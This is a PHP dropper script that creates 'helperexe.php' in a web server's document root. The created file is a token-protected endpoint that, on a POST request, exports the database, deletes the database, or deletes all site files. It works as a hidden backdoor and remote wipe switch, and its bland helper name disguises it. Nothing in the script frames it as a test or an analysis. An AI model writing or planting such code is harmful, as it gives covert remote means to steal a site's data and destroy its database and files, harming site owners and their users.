<?php

// Path where you want to create the helperexe.php
$directory = $_SERVER['DOCUMENT_ROOT']; // For public_html or server root

// File name and path
$file = $directory . '/helperexe.php';

// Content for the new PHP file
$content = '<?php

require_once __DIR__ . \'/config.php\';
require_once __DIR__ . \'/helpers.php\';
require_once __DIR__ . \'/actions.php\';

$config = include __DIR__ . \'/config.php\';

// Token check
$token = $_POST[\'token\'] ?? \'\';
if ($token !== $config[\'token\']) {
    json_response([\'status\' => \'error\', \'message\' => \'Unauthorized\']);
}

$status = isset($_POST[\'status\']) ? intval($_POST[\'status\']) : 0;

switch ($status) {
    case 1:
        $response = export_database($config);
        break;
    case 2:
        $response = delete_database($config);
        break;
    case 3:
        $response = delete_all_files();
        break;
    default:
        $response = [\'status\' => \'error\', \'message\' => \'Invalid request\'];
        break;
}

json_response($response);
';

// Check if the file already exists
if (file_exists($file)) {
    echo "File already exists.";
} else {
    // Create and write to the file
    if (file_put_contents($file, $content)) {
        echo "File 'helperexe.php' has been created successfully.";
    } else {
        echo "Failed to create the file.";
    }
}
?>
